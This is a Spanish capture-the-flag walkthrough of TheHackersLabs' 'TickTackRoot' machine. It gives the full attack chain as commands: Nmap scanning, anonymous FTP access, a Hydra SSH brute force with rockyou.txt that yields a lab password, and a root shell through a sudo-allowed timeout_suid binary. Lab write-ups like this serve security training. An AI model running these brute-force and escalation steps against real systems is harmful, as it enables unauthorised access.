# 🏁  Resolución del CTF "TickTackRoot" | TheHackersLabs
🔍 1. Escaneo de puertos
Se ejecutó un escaneo agresivo con Nmap:

bash
Copiar
Editar
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.20.10.6 -oN escaneo.txt
Puertos abiertos:

21/tcp → FTP (vsftpd 3.0.5, permite acceso anónimo)

22/tcp → SSH

80/tcp → Apache httpd 2.4.58 (Ubuntu)

📂 2. Enumeración del servicio FTP
Se permitió acceso anónimo, y al conectarse se mostró el mensaje:

Copiar
Editar
220 Bienvenido Robin
Este banner fue clave para orientar la fuerza bruta posterior.

Navegando por el FTP:

bash
Copiar
Editar
ftp 172.20.10.6
Se accedió al directorio /login donde se descargó login.txt:

bash
Copiar
Editar
get login.txt
Contenido del fichero:

nginx
Copiar
Editar
rafael
monica
🔐 3. Ataque de fuerza bruta con Hydra
Aunque inicialmente se probó con rafael y monica, se descubrió (al revisar el banner) que el nombre Robin era un posible usuario válido.

Ataque final exitoso:

bash
Copiar
Editar
hydra -l robin -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.6 -f
Resultado:

pgsql
Copiar
Editar
login: robin  password: babyblue
💻 4. Acceso SSH como usuario Robin
bash
Copiar
Editar
ssh robin@172.20.10.6
Credenciales válidas, acceso exitoso al sistema:

css
Copiar
Editar
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
🧨 5. Escalada de privilegios
Ejecutando:

bash
Copiar
Editar
sudo -l
Se encontró:

bash
Copiar
Editar
(ALL) NOPASSWD: /usr/bin/timeout_suid
Buscando en GTFOBins se identificó que timeout permite escalada:

bash
Copiar
Editar
sudo timeout_suid --foreground 7d /bin/sh
Esto nos da una shell como root 🏆

🎯 Conclusión
✅ Acceso inicial por FTP anónimo

✅ Reconocimiento de nombres de usuarios en login.txt

✅ Banner nos revela el usuario Robin

✅ Fuerza bruta exitosa con babyblue

✅ Escalada con binario timeout_suid
